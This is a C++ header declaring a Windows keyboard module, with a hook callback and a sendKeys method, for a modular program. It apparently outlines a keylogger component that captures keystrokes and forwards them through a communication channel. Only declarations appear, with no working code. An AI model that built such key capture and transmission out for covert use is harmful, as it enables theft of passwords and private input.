//
// Created by Benoit Hamon on 10/4/2017.
//

#pragma once

#include <Windows.h>
#include <boost/shared_ptr.hpp>

#include "../IModule.hpp"

class ModuleKeyboard : public IModule {
public:
    void start(ModuleCommunication &com) override;

public:
    static boost::shared_ptr<ModuleKeyboard> create();

public:
    static LRESULT CALLBACK hookCallback(int nCode, WPARAM wParam, LPARAM lParam);

private:
    void sendKeys();

private:
    bool _running;
};
